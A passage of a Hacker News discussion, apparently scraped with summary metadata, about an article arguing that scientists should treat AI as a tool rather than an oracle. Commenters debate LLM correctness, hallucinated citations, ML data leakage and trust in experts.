impossible\" ... does that really riff on \"on the face of it\", or is it farcically misspelt? Garbage in, garbage out 8) reply tikhonj 17 hours agorootparent\"Facially\" in the sense of \"on the face of it\", roughly as a synonym for \"obviously\", seems like a pretty standard usage to me—this is certainly not the first place I've seen the word used in this sense. reply fragmede 17 hours agorootparentprevAlso from the article: > Also, ML code tends to vastly more complex and less standardized than traditional statistical modeling. I mean, hey, it's proof that the text isn't AI generated, since ChatGPT is better at English than that, but it makes it hard to read and I'm not going to buy their book if it's going to be full of errors like that. reply throwanem 19 hours agoprevIf this is already such a problem even in the professional discipline and vocation whose sine qua non is the accurate analysis of physical reality, I'm really nervous about the next few years. And I was nervous already... reply captainkrtek 19 hours agoprevIn my professional work, I treat chatgpt as a search engine that I feel I can ask questions of in a natural manner. I often find small flaws in technical solutions it offers, but it can still provide useful starting points to investigate. I rarely trust code it generates (at least for the language I mainly work in) as i’ve seen it make some serious mistakes (eg: using keywords in the language that don’t exist) reply SrslyJosh 18 hours agoparent> I rarely trust code it generates (at least for the language I mainly work in) as i’ve seen it make some serious mistakes (eg: using keywords in the language that don’t exist) It's only a mistake from your perspective. The model just generates text based the probabilities it learned during training. In that respect, there is no such thing as \"incorrect\" output because the model doesn't operate at that level of abstraction. reply tombert 18 hours agorootparentWait, no, it's \"incorrect\" in the sense that you asked it to do something, and the thing it gives you doesn't accomplish the task. I asked it \"what is the PS3 game where the full version of To Kill a Mockingbird is in there?\" and it responded back with \"The Sabateour\", when the correct answer would have been \"The Darkness\". That is incorrect by most definitions of the word, whether or not it's a consequence of the training model doesn't really change that. I suppose we could get into details about epistemology and ontology about the nature of what an answer \"is\", but I think it's fair to say that \"incorrect\" is when it gives you something that doesn't accomplish the task you asked it to do, or rather when it tries to accomplish the task but what it gives you don't work. reply antonvs 16 hours agorootparent> Wait, no, it's \"incorrect\" in the sense that you asked it to do something, and the thing it gives you doesn't accomplish the task. You believe you \"asked it do something,\" but that's just you anthropomorphizing the model and your interaction with it. Of course the AI companies encourage that perspective, but it's a factually dubious one at best. Judging whether a model's output is \"correct\" involves you imposing an external context on both the prompt and response that the model typically doesn't have access to. It also typically has no ability to test its responses. This is part of why good prompt engineering can be so important - because what you get out is a function of what you put in, and pretending that the model is a question-answering oracle only takes you so far. Of course what the AI companies are trying to do is train and prompt the models in such a way that their output is considered \"correct\" from a user's perspective more often than not. In an interaction with an AI company's salespeople, you might argue about \"correctness\". But that's not going to help understand what's actually going on. reply tombert 16 hours agorootparentIt's actually not \"anthropomorphizing the model\". I passed it input in the serialized form known as \"English text\". I expected a response also in serialized English that I can then decode in my brain to something that comports with reality. If I requested from a web server some JSON giving me my bank balance, and the balance it gave me is not accurately reflecting reality, it's not anthropomorphizing anything to say that it's incorrect, any more than pinging Nginx is. And to be clear, we can wax philosophical all you want about \"correctness\", but that's really sidestepping the point: I don't care why it's giving me wrong information. In my bank example, does it really matter, for the end user, if it's because of some integer overflow error or if it's a null pointer there's just a special `if` statement saying that antonvs account should always print out a different number for your balance. I think nearly everyone would say that that's incorrect, and it actually wouldn't be clever or insightful for someone to say \"no that's just a result of how the computer was programmed! You're imposing a human understanding of correctness on your bank balance!\" reply antonvs 15 hours agorootparent> I expected a response also in ... Exactly, you expected it, but that doesn't change what's actually happening. The model doesn't know what you expect. It can't read your mind. The best it can do is infer some things, such as that English input should produce English output - and the models are indeed pretty good at that! > to something that comports with reality. This is a rather unrealistic expectation in general, when you examine it. You raised a good example with which to do that, though: > it actually wouldn't be clever or insightful for someone to say \"no that's just a result of how the computer was programmed! You're imposing a human understanding of correctness on your bank balance!\" You're right, it wouldn't, because that's a very different situation which helps illustrate the point. The code for the bank app has been written to match your notion of correctness. That's only possible because it has a narrowly defined, specific purpose. It has all the necessary information needed to produce a correct response. The acceptance criteria are clear, including validation and integrity checks on the response. As a result, your expectations should be satisfied, and if they aren't, it makes sense to say that the bank app is not correct. None of that applies to the AI models we're discussing. An LLM or image model doesn't have a narrowly defined, specific purpose. It can't possibly have access to all the information it needs to \"answer\" any possible \"question\" \"correctly\". It can't possibly have access to acceptance criteria specific to a question unless they're provided explicitly and in detail as part of a prompt - again, underscoring the importance of prompt engineering. And its ability to validate responses - check whether they \"comport with reality\" - is very limited, at least currently. An example that's closer to the situation with an AI model would be a tool like a hammer. If you hold a hammer by its head and try to hammer in a nail with its handle, is the hammer \"incorrect\" when it fails at the task you have \"asked\" it to do? > I don't care why it's giving me wrong information. Just as with the hammer, if you want to be able to use these tools effectively, you should care why. reply tombert 15 hours agorootparentWe’re talking about different things. Let’s look at regular intelligence. Stuff in human brains. If I ask a human a question like “how many sides does a square have?” and that human says “three”, that’s an objectively wrong answer, and I would say that that person is “wrong”. The human brain also does not have a narrowly defined specialized purpose and can do a lot of things and yet we are perfectly ok still saying “true” or “false” to the truth values being asserted. A truth proposition can have a “correct” or “incorrect” value. If a human gives me the wrong bank balance because they misremembered it, it’s still wrong regardless of the actual intelligence associated with it. So again, I don’t think this kind of pedantry is actually useful because you’re not actually saying anything; you’re saying “these models aren’t trained on being correct, they’re on word patterns”, which was never disputed, but that is orthogonal to the truth value. reply rsynnott 5 hours agorootparentprevYou're anthropomorphising too much. The machine did the correct thing; it's just that it is a prediction machine, not a magic question answering machine, so its 'correct' may not be what you wanted. > I suppose we could get into details about epistemology and ontology about the nature of what an answer \"is\" The machine has no concept of an 'answer'; when people call these things autocomplete on steroids, they're not really being that inaccurate. reply tombert 5 hours agorootparentIt really isn’t anthropomorphizing at all. If I treat it like a black box it really is quite simple. I gave it an input in the form of English text, there is an objectively correct and incorrect form of English text that responds to the input, it gave me the incorrect one. Literally no one here disputes that the it’s a glorified autocomplete, but that is completely irrelevant to if it correctly answered a question. I find this kind of pedantry extremely annoying because it sounds insightful without actually saying anything. Like, no shit, it’s just doing what its algorithm dictates, no one, and I mean no one disputed that. The question of correctness and incorrectness falls into “how accurately did it respond to my query?” reply nomel 18 hours agorootparentprevThis is like saying the arguments put forth by a schizophrenic lawyer are rational and correct. If the context is that it's a tool, correct is defined as reality within the context of the use of that tool. If it's to find facts, it can be incorrect, since the context of a fact is reality. If it's writing a story, then \"correct\" would be based on continuity, etc. If you're using it as a tool to generate words related to previous ones, then sure, it's always correct, but that's not probably not a useful tool for most people. But, being a next word predictor doesn't mean it can't also be a useful tool in real world contexts. There are, literally, billions of dollars being spent on pushing them to be more \"correct\" in more contexts, so it's a useful concept being considered, even though they're \"just\" next word predictors. reply LordKeren 18 hours agorootparentprevWhile yes, this is the technical reason — it’s important to not overlook how non-technical people see LLMs. And not only that, how they are being marketed. I’m struggling to think of any comparable technology where the regular median users understanding is both fundamentally wrong— and is being purposefully misinformed. reply tikhonj 17 hours agorootparentprevThat's like saying \"there is no such thing as a bug, it's just code working the way it was written\"—true in some sense, but not useful. reply williamcotton 17 hours agorootparentprev“Correctness” is a property of a proposition determined by an observer. Sometimes what is output by an LLM is correct, sometimes not. That an LLM is aware of the output or not means literally nothing. reply VS1999 18 hours agorootparentprevThis habit of latching onto one word specifically to ignore what everyone knows is obnoxious, pedantic, and most of the time not even technically correct. It's just stupid quibbling over how words in English can be used to mean different things. And just so you know, the model doesn't \"learn\" anything, you're just adjusting weights until you get a desired result. reply elicksaur 16 hours agorootparent“What everyone knows” - https://www.lesswrong.com/posts/BNfL58ijGawgpkh9b/everybody-... More broadly, the meaning and usage of specific words are important for these products because they shape how people perceive their utility. If a thing isn’t “correct” because it has no sense of understanding, and therefore is only “correct” due to projection by the user, then that’s a super important distinction. reply userbinator 17 hours agoprevPeople treating tools like they're infallible has been a problem since computers were invented, but IMHO the biggest difference with AI is how confident and convincing it can be in its output. Much like others here, I already have had to convince, very carefully, many otherwise-decently-intelligent people who believed ChatGPT was correct. Thus I think the biggest success of AI will be the arts, where imprecision is not fatal, and hallucinations turn into entertainment instead of \"truths\". reply antonvs 17 hours agoparentI think this misses something important. If it makes economic sense, corporations will figure out ways to integrate AI into their processes, even if it's imperfect. After all, companies are already built out of humans who are also often confidently wrong - but successful companies have ways to detect and mitigate that. In fact, that's one of the primary requirements for a company to survive, that it's able to build a functioning system out of imperfect components, particularly humans. You can see an example of this in the use of LLMs to generate code. In that case, there's a whole SDLC pipeline designed to detect errors: type systems, language compilers and runtimes, tests of various kinds, QA, user feedback, etc. We don't just trust confident software developers to produce correct code. Even a life-critical function like medical imaging - where imprecision can be fatal - can potentially benefit from this, where AI is used in conjunction with human review. It mainly requires development of some standards of practice - unlike with an average user blindly trusting the output of a model, radiologists would need training on how to use the models in question. reply quantum_state 18 hours agoprevAI is a tool … a fool with a tool is still a fool … For natural sciences, there is no need to worry since nature would provide the ultimate check … for social “sciences”, it is entirely a different story. reply benhoyt 19 hours agoprev> People should use AI as a tool, not an oracle There, fixed the title. reply az09mugen 19 hours agoparentPeople must not use AI as an oracle, but rather as a tool. I think this is even better reply TheRoque 19 hours agoprevThe worst is having random people questioning your expertise because of what ChatGPT told them. reply godelski 19 hours agoparentTo be fair, people did this before ChatGPT. It's just the thing they point to as evidence now, and they'll always find something. The underlying problem is much bigger: 1) people confidently arguing with domain experts about topics that they have little to no experience in. 2) people valuing the opinions of arguers from 1 over experts. reply alvah 18 hours agorootparentTo be extra fair, \"domain experts\" in some areas have had a bad few years; there are a couple of fields I can think of off the top of my head where the \"experts\" wheeled out to advise/scare the public are clearly more influenced by politics (or saving their own skin) than science. Replacing trust in experts with trust in LLMs is obviously dumb, but who is Joe Sixpack supposed to turn to? reply l33t7332273 17 hours agorootparent> there are a couple of fields I can think of off the top of my head where the \"experts\" wheeled out to advise/scare the public are clearly more influenced by politics (or saving their own skin) than science This feels like a thinly veiled jab at COVID era public health recommendations. Can you be more clear about which fields you’re referring to? reply hierophantical 6 hours agorootparentprev\"domain experts\" are often totally wrong and there is nothing new about this. When our state of knowledge of the world changes , \"domain experts\" have the most to lose and our state of knowledge of the world is constantly changing. Most domains also don't have the exactness of a programming language so are exposed to the same human processes as displayed in a middle school popularity contest. The whole concept of the \"domain expert\" is really a modern superstition. An especially powerful superstition because it is the superstition of those who believe themselves beyond superstition. reply godelski 18 hours agorootparentprevI'm not sure which domains you're referring to. I can think of domains where sensationalist opinions are lifted, but not ones where the general consensus is blatantly false. I can think of plenty of instances where large news organizations have grossly misrepresented conclusions of research. > but who is Joe Sixpack supposed to turn to? This, I agree with. It is why I actively voice dissent, as an expert and in areas where I have domain expertise, against so-called science communicators (not all are \"so-called\") and when the news gets it wrong. Hell, I'll do this when actual science communicators get it wrong. Like when Niel DeGrassee Tyson is being dumb[0]. He also thinks hydrogen bombs don't have fallout...[1]. They do... That said, I still don't think this is a reason to distrust scientists. But I think it is important for scientists to speak out when communicators get it wrong. I think this is a common problem and allows the conmen to gain power. But that's not the only force at play. Truth is complex. Approximate truth is bounded in complexity. But lies can be infinitely simple. So we get it wrong when we \"reason our way through\" something, because typically the base assumptions are wrong. This makes many conmen truly believe the lies that they are selling. Joe Sixpack can reason through that. But Joe Sixpack can also reason through the concept that if he was easily able to reason through something and that experts disagree, it's pretty likely there's a reason why other than them being dumb andknowing better. Can, but doesn't. And we as the public let that happen. This may seem like an insurmountable problem, but instead it is a problem which just needs sufficient effort. Momentum builds, so the more people that push against this, the more common it'll become. And to be clear, it is perfectly fine to question experts. It is not perfectly fine to confidently disagree while not actually understanding the topic. If you don't know the difference, read a few papers/works in the topic and see if you can understand 90+% of it (if it is CS or Engineering, see if you can replicate). [0] https://www.youtube.com/shorts/a-PHXGmexxM [1] https://www.youtube.com/watch?v=QGa4ItIOCRg reply fragmede 18 hours agoparentprevDoctors had this moment when Google first came out reply ThunderSizzle 5 hours agorootparentTo be fair, I came across doctors who are no better than a static webpage from the CDC. I fire those doctors pretty quickly. reply dluan 19 hours agoprevScientists have been obsessed with over-optimzing for FOMO for the past decade - what papers should I read that I don't have time for, what grants should I apply for that I don't know about, what projects should I work on that will give me the best ROI, who in my field is poised to disrupt or make a big leap, etc. Some even think that the end goal is actually an autonomous research agent that can make decisions about what questions to ask and why, and that's one of the true marks of AGI. That to me is insane and misses the entire point of science altogether, even once we reach that technical feasibility. We ask questions about the universe to expand our human relationship with the universe, not to just amass more research capital for the sake of it. And the fact that the AI snake oil has infected big chunks of science reveals which parts of it are just gold rush speculation and which aren't. There's a more fundamental challenge of training scientists to understand why we ask the questions we ask. You can't just offload that to some background task and trust that it makes sense. reply Onawa 18 hours agoparentI understand the point that you're making about overoptimizing for FOMO in science. I wanted to give you another perspective from a scientist working within the US government that doesn't care about playing that game. Our governmental research agency, and NIH as a whole has TONS of research data that we don't have the manpower to screen and provess. There are also gaps in data that AI/ML could help us simulate. AI research assistants could potentially help us process and evaluate \"what questions to ask\" by, for example, looking for trends in QSAR (quantitative structure-activity relationship) models for novel chemicals and help us direct our attention to compounds of toxicological interest. We've also been trying to use the AI research assistants to speed up the process of evaluating the scientific literature for toxicologists who have to make regulatory decisions. Our agency has a backlog of chemicals that we would love to evaluate, but lacks the manpower to do so. No profit motive or much \"clout\" interest, at least that I've seen. Just a lot of public servant scientists who need some extra help protecting the public. reply devjab 13 hours agoprevI would have thought scientists weren’t going to use these tools to do research considering they as a group are far more exposed to things like peer reviews and critical thinking than general society. What worries me the most about these AI solutions, however, is their usage in the public sector. They can certainly be useful helpers, like, they can scan images for cancer and if added to existing processes involving humans, often lead to enhanced results. They can’t replace any existing methods, however, as we learned here in Denmark a few years ago. Unfortunately that lesson hasn’t been learned across the public sector. I think medicine and healthcare learned it, but right now, we’re replacing actual human controls, audits and sometimes decision making with AI or an unwarranted trust in AI results. Which is going to lead to some really terrible results considering how bad things like LLMs often are at being lucky in even “common knowledge” situations. It’s further enhanced by how some of the work it’s tasked to do isn’t as black-and-white as writing code is. We use AI tools in our daily work, and they are ok, but as anyone who’s used them for programming probably knows by now, they aren’t exactly great at being lucky. Sometimes they’ll hallucinate solutions that simply do not exist. This is how they work, and as I said earlier, AIs can be great enhancers. They aren’t replacements though, and if we start treating them like they are, which is very tempting from a change-management and benefit-realisation perspective, we’re just going to get in trouble. This is unfortunately exactly what we’re doing, and why wouldn’t we? Most western public sectors have functioned on at least some form of new public management for two decades by now, sometimes longer. As a result the entire systemic culture is geared toward efficiency and cost reduction, even when it doesn’t really result in either efficiency and cost reduction on a broader perspective. Now, if scientists are on board. Then what hope does a public bureaucracy have? reply cdme 18 hours agoprevIt's marketed and sold as an oracle. The AGI crowd feels like a cult. reply shmatt 19 hours agoprevI feel like 90% of AI discussions online these days can be shut down with “a probabilistic syllable generator is not intelligence” reply rsynnott 5 hours agoparentEven people who _know_ that often seem to have difficulty intuitively believing it, is the trouble; it's very good at _appearing_ to be intelligent, good enough that even people who should know better sometimes think that the correctness problems are just a case of \"need more GPUs\", rather than insoluble. reply BriggyDwiggs42 16 hours agoparentprevHow do you define intelligence? reply WalterSear 18 hours agoparentprevThat hasn't worked for me. reply Zambyte 17 hours agoparentprevHumans are not fact machines, we are often wrong. Do humans not have intelligence? What do you even mean by \"intelligence\" when you say a probabilistic syllable generator \"is not intelligence\"? reply dotnet00 17 hours agorootparentLike clockwork, out come the \"but humans\" deflections. An LLM is not a human-like intelligence. This is patently obvious, such comparisons are nonsensical and just further the problem of people anthropomorphizing a tool and treating it like an oracle. reply Zambyte 17 hours agorootparentYou didn't answer the question. reply dotnet00 17 hours agorootparentI did, I said they aren't human-like intelligences, so countering with \"humans make mistakes, are humans not intelligent?\" is drawing a false equivalence between humans and LLMs. Since we do not possess a definition of intelligence that isn't human-like, it would be meaningless to argue if LLMs are intelligent in general. All that can be said is that they are not intelligent in the way that humans are. reply Zambyte 16 hours agorootparentThe question you answered was rhetorical; obviously humans are intelligent. There is another question that actually has an interesting answer after it. In fact, it's not possible to have a meaningful discussion without answering it. I thought that was obvious :) reply dotnet00 16 hours agorootparentMaybe I'm miscommunicating, I know that the question about whether or not humans are intelligent is rhetorical. What I'm trying to say is that \"humans make mistakes and are obviously intelligent, so a probabilistic syllable generator can be considered intelligent despite making mistakes\" does not necessarily follow because at best they're different kinds of intelligences. In my rush to be a smartass, I did miss that you also asked what definition of intelligence they were working with though, so I suppose I didn't really add anything besides unnecessary snark (-‿-\") reply chomskyole 4 hours agoprevMaybe they should also call it \"curve fitting\" instead of \"AI\" so they don't need to call a \"poor fit\" a \"hallucination\" reply hollerith 4 hours agoparentIt's all very simple, eh? reply chomskyole 4 hours agorootparentLook, it's a bit late here so I don't really have time to fully refute your sophisticated argument. But let me ask you this: if AI is not curve fitting, what is it then? reply hollerith 3 hours agorootparentI'm objecting to the implication that if we start referring to it as curve fitting rather than AI, then thinking about it becomes easier and it becomes less likely that we will make a huge collective mistake in thinking about it. I'm not saying there aren't a few possible mistakes that do become less likely if we switch to \"curve fitting, but I suspect that it does not matter much either way on the most serious mistakes. reply skrap 18 hours agoprev...but why wouldn't they use AI as an oracle? From an outsider's perspective, it seems that there's already plenty of incentive to test the margins of acceptable academic practice in order to produce more papers or publish more quickly. Sadly I feel like it'll become the norm to have a chatbot interpret your results and write your paper rather than using those expensive grad students. I don't have answers; just the lingering question \"why are we building this?\" reply Kalium 17 hours agoparentWe're building this because the ability to make narrow, specific predictions can be narrowly and specifically useful. This works if you have a good understanding of both the tools and the domain you're looking to make predictions in. Unfortunately, from an outsider perspective, this looks like being widely and generically useful. If you don't understand your tools, you're going to misuse them, and this hype cycle is the result. reply m3kw9 18 hours agoprevTo know when to be skeptical to LLMs you have to know how it is trained and inferenced, and you have to use it often to see how it can screw up reply logrot 19 hours agoprevBut surely if it's artificial intelligence then it'd know its limits and would respond appropriately? Oracle use no problem? It is it because it's actually shit but it's the best thing we've seen yet and everyone is just in denial? reply mewpmewp2 18 hours agoparentPeople constantly misevaluate their own limits though. Why should AI not be allowed to do that? reply Jensson 17 hours agorootparentProfessionals don't constantly misevaluate their limits, if the AI is to replace a professional it has to know its limits. reply mewpmewp2 12 hours agorootparentCurrent AI is for productivity boost, not to replace. And automation of certain use cases, but not all. It is already really good at those things. reply threeseed 17 hours agoparentprevIt depends on who you mean. Most normal people look at AI like ChatGPT as an amazing tool and have used it effectively as a replacement for Google, Grammarly etc. And for them it's fine because any mistakes are localised to them. The problem are those building products on LLMs e.g. Legal, Customer Service who are knowingly misrepresenting the capabilities of what it can do to companies who don't know any better. And I would argue this is fraudulent and where we will see most of the problems. reply 10000truths 18 hours agoprevIs \"leakage\" just another term for overfitting? reply dotnet00 17 hours agoparentI think a popular example of leakage would be that of a tank recognition AI that perfectly handles training/testing data but fails in real use, because all the tanks of one country happen to have a tree in the background, while those of the other do not, effectively leaking the image label and making the model look for a tree instead of the tank. Even if you trained less or used fewer parameters, it'd still go for the easiest route of trying to detect features of a tree. You'd have to change the training data. reply XenophileJKO 17 hours agoparentprevNo usually it means the data that you intend to test the model on was accidentally used to train the model. There are more complex scenarios where you get leakage without actually showing the model the test examples. Where you have features that have future information in them that you won't have at actual inference time. So usually it ends up in overfitting, but is more about having information at training time that it shouldn't. reply russfink 16 hours agoparentprevThese are two different definitions. Can someone please disambiguate? reply bbor 19 hours agoprevWow I came into this article angry, idk if their book title accurately conveys the sober, expert analysis it contains! In case anyone else is curious why they’re talking about “leakage” in the first place instead of the existing term “model bias”, here’s the paper they cite in the “compelling evidence” paper that started these two’s saga with the snake oil salesmen: https://www.cs.umb.edu/~ding/history/470_670_fall_2011/paper... Crux passage: > Our focus here is on leakage, which is a specific form of illegitimacy that is an intrinsic property of the observational inputs of a model. This form of illegitimacy remains partly abstract, but could be further defined as follows: Let u be some random variable. We say a second random variable v is u-legitimate if v is observable to the client for the purpose of inferring u. In this case we write v € legit{u}. > A fully concrete meaning of legitimacy is built-in to any specific inference problem. The trivial legitimacy rule, going back to the first example of leakage given in Section 1, is that the target itself must never be used for inference: > (1) y !€ legit{y} So ultimately this all about bad experimental discipline re: training and test data, in an abstract way? I’ve been staring at this paper for way too long trying to figure out what exactly each “target” is and how it leaks, but I hope that engineering-translation is close reply bitwize 17 hours agoprevLLMs are basically Dissociated Press, but with deeper layers of statistics for a better function approximation than a simple Markov chain. It's really doing the same thing though: pick the next sequence of characters that best follows the foregoing characters. Not something I'd trust as a \"source of truth\". Maybe a neat idea generator. And some of the deep learning algorithms can identify patterns that humans might miss -- patterns that could reveal useful insight. But they're not doing the knowledge work. reply teknopaul 18 hours agoprevNo shit sherlock reply LouisSayers 19 hours agoprevNot just scientists, but everyone! My partner recently went a bit nuts writing an article with the help of GPT4. She was very proud of how productive she'd been until I asked if she'd actually searched for the papers GPT4 had referred to. Of course, many of the referred to papers didn't exist... reply flatline 19 hours agoparentThat is not writing with the help of GPT 4, that is letting it write for you! I can’t imagine doing anything creative and letting a computer source material for me without having reviewed the material first hand, even if it was accurate. Clearly, this is not where everyone’s head is at, and I suspect your wife’s workflow is more the common case. I’ve said from the outset that in academic settings you should be able to cite an AI as a writing assistant, it would clear up a lot of the confusion about its use. If you used it poorly it’s still on you, but at least there’s some transparency by which to judge the work. reply Mathnerd314 19 hours agorootparentI've sort of worked out a workflow. Like say I had to write an essay and take a side for/against something. Then I would ask GPT to write the strongest argument for, and the strongest argument against, telling it to make up whatever sources it wants. Then after reading those, I would have some idea of my own opinions. I would write from scratch but with the GPT for/against pulled up alongside as reference for how to structure the arguments. Then I would put it through GPT again for proofreading and grammar (or just spelling, if there is AI detection software). It is a bit tricky though, there are definitely points that come up with GPT that people would not think of normally. So in that sense it is still distinguishable from writing solely by oneself, but I would argue the GPT-assisted essays are just better writing and more well-rounded. reply bsenftner 18 hours agorootparentThere is a subtle aspect of LLM AIs that is lost to most people: they are trained on the entirety of the Internet. That means whatever topic you ask these LLM AIs, there are multiple instances of that same information with different levels of seriousness and accuracy in their treatment of the subject. For example: if one asks a question using street slang, the answer generated will be generated from training data about your subject, but from online sources that used street slang in their conversation about that issue. Likewise, if you use ordinary language for your question, the generated response will be from ordinary language conversations of your topic. However, if your question concerns any type of formalized knowledge, by asking your question using the formal language of experts in that topic, then the generated AI answer will come from training data that used this same formal expert terms, and are most likely to be correct, because they come from discussions of that subject’s matter experts. Plus, don't use LLMs for fact retrieval, use them as strategy guides. They really excel as strategy advisors. reply choilive 18 hours agorootparentTheres actually even more subtlety here, in all of your examples the \"knowledge\" should theoretically be embedded nearby each other in the same vector space, so regardless of the style of language used, semantically they should all pull from similar weights, and thus give similar answers. This is one of the reasons why LLMs are so powerful.. because they seemingly understand the semantic relationships of words so regardless if the prompt is posed casually or formally it should give similar answers in terms of factuality. I agree with you that LLMs today should be primarily used for more creative output. reply bsenftner 6 hours agorootparentThat assumes that street slang discussions, using entirely different conceptualizations of ideas, would indeed be embedded nearby one another. Plus, both the street slang and ordinary language will tend to treat the information in a less precise, a less concept discriminating manner (meaning the subtle distinctions between issues may be lost in their discussions). In my tests, I find one indeed needs to use the subject matter expert for precise treatment of formal knowledge and generated answers that are more accurate. reply LouisSayers 14 hours agorootparentprevIt's kinda scary to think that researchers would be using ChatGPT other than a rubber duck to bounce ideas off of. There are a couple issues I can see in that people may be unaware of how much the AI's hallucinate, but also there's a real probability that people will pick and choose what they like based on what sounds correct vs what is correct. AI is a great tool, but it's also convincingly deceiving at times, so much so that many people are totally oblivious to it. reply xarope 16 hours agorootparentprevpersonal anecdata: I had written a few paragraphs of factual information, and decided to see what GPT 4 would do with it. So I asked it to rewrite the information several times, using a different voice (e.g. write it with an optimistic view, pessimistic view etc) EVERY single \"fact\" was perverted by either mixing with another fact, or misrepresenting by replacing a word like \"good\" with \"superb\" or \"fantastic\" (I guess optimistic means lie-through-your-teeth?) YMMV, but basically I achieved nothing except a waste of about 30mins and an honest, personal evaluation of the limits of GPT. reply EGreg 18 hours agorootparentprevYou sound like the people who used to know how to fix a car, or sew, or write cursive, or do multiplication times tables in their head, or know how to derive a formula, or check a mathematical proof. Ask anyone below 30 if they can write cursive today, or know their times tables hehe. Ask them if they can derive a formula instead of using Mathematica. Or ask a developer if they know how their pixel shaders work, or what’s going on under the hood of their favorite runtime, how hash tables work, or really anything. Previous generations did. When the complexity gets too high people just trust the machines I guess. And no one actually knows what the LLM internals are anyway. reply dotnet00 17 hours agorootparentIf you're driving you don't need to know how to fix a car, but relying on GPT to write for you to the extent of accepting its generated citations without checking them, is the equivalent of running around looking for blinker fluid as you attempt to fix your car. reply JeremyBarbosa 19 hours agoparentprevSadly it's not even just references, LLMs still hallucinate or at least misrepresent even the most basic of facts. That and the stereotypical GPT-verbage makes it impossible to use for writing anything significant. reply SrslyJosh 19 hours agorootparent> LLMs still hallucinate Keep in mind that there's no difference between what happens inside a model when it \"hallucinates\" vs. when it generates \"correct\" output. It's the exact same process. reply alpinisme 18 hours agorootparentThat’s true, but it’s also true of anything else that makes mistakes, including buggy software. When a buggy sorting algorithm produces a bad ordering it’s doing so “with the exact same process” the good ordering is coming from. Ditto for humans and their slips (although tbh I get a little tired of the analogizing of humans and llms…not that the analogies are wrong, but just that we always analogize human minds with the latest technology: wax writing pads through computers) reply raincole 18 hours agorootparentprevUh... yes? I'm not sure why it's some significant insight. Surely when google gives bad results, it's \"the same process\" as when it gives good results. And when a book gives wrong information, it's the exact same kind of ink as correct information. reply Terr_ 18 hours agorootparentI think the point is that it's not some kind of bug to find and fix, it's a fundamental risk with the entire approach. reply switchbak 18 hours agorootparentprevWe were already swimming in a world of bullshit prior to the wide availability of these. I'm not sure what the future holds, but I think intelligent people are going to become very skeptical of virtually all information sources. I would imagine there's also a raft of people who will use it as a reason to give up on any search for truth. I still do hold a lot of hope for their eventual capabilities, but I'm also pretty pessimistic on what the direct and Nth order social effects will be. reply colechristensen 18 hours agoparentprevGPT-whatever can’t do sources. I was trying to use it as a research tool and it hallucinated 95% of the references I asked for (not a made up percentage, I counted) Ironically the one real source turned out to be quite useful. reply EGreg 18 hours agoparentprevHmm. In the future the AI in nefarious hands can retroactively make the papers first, and get them past the censors. Just make up a lot of bullshit and then it’s turtles all the way down lmao reply Terr_ 18 hours agorootparentI'm imagining how much easier it would have made work for the Ministry of Truth in 1984. reply duxup 19 hours agoprev [–] We use search that way, don’t see why AI trained on similar content wouldn’t be just variable in terms of reliability. reply skywhopper 19 hours agoparent [–] This is incredibly simplistic. Search engine results give a lot of context clues about the reliability of their asserted facts and provide a potential spectrum of answers. LLM-generated answers strip all that away, and give a single authoritatively phrased answer. Even if you’re inclined to disbelieve it, the LLM answer gives you no ability to dig in, refine, or compare. It just is. If you ask a chatbot if it’s sure, it might double down, or apologize and then repeat itself, or say it was right and give a contradictory followup. Traditional pre-spam-overload Google results could often give a high quality answer, or if not, you’d at least get the sense of the low quality. Not so with LLMs. reply duxup 19 hours agorootparent [–] I think you overestimate people’s ability to sniff out bad data on the internet. Also are you suggesting people fact check an AI by asking it if it is correct? That seems absurd. reply threeseed 17 hours agorootparentBut you could trust certain websites being more accurate than others based on their brand, the author, the other content the site had published, who they are linking to and people linking to them etc. LLMs remove that ability to be discerning about what to trust. reply dotnet00 17 hours agorootparentprev [–] Pre-LLM madness, most decent scientists were capable of judging the reliability of a source, at least to an extent. Eg if the source is a paper in a decent journal, it probably has at least some substance to it and the basic facts are probably not wrong, if the paper is a zero-citation paper on vixra where none of the authors have any reasonable history, you'll probably have to check everything. reply GuidelinesFAQListsAPISecurityLegalApply to YCContact Search:",
    "originSummary": [
      "Arvind Narayanan and Sayash Kapoor argue that AI should be used as a tool, not an infallible oracle, in scientific research, critiquing the hype that leads to flawed studies.",
      "They highlight issues like \"leakage\" in machine learning, poor reproducibility, and the failure to share data and code, exacerbated by the publish-or-perish culture and overoptimism.",
      "The authors call for better research practices, data sharing, and a cultural shift towards careful and reproducible science, suggesting reallocating some AI funding to improve training and quality control."
    ],
    "commentSummary": [
      "The discussion critiques the overreliance on AI in scientific fields, emphasizing risks like data leakage and the tendency to trust AI over expert opinions.",
      "It calls for a balanced approach that values expert knowledge and critical thinking, highlighting the need for genuine expertise in AI safety.",
      "Concerns are raised about AI's limitations in generating reliable content and its potential misuse, advocating for human oversight and proper training to mitigate errors."
    ],
    "points": 116,
    "commentCount": 103,
    "retryCount": 0,
    "time": 1717451649
  }
]
